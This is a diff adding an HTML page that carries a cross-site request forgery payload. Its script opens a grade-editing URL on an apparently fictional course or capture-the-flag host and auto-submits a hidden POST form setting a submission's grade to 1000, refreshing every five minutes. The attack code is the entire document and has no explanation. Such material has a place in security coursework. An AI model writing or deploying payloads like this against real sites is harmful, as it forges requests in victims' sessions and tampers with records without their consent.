@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+    <head>
+        <meta http-equiv="refresh" content="300">
+    </head>
+    <body>
+        <script>
+        var url="http://ywang90-flag.foouniversity.com/edit-grade.php?handin=228";
+        var tmp = window.open(url,"profile");
+        document.write('<form id="wrappingThing" action="'+url+'" method="post"><input type="text" name="grade" value="1000"><input type="hidden" name="handin" value="228">');
+        document.forms["wrappingThing"].target = "profile";
+        document.forms["wrappingThing"].submit();
+        </script>
+    </body>
+</html>
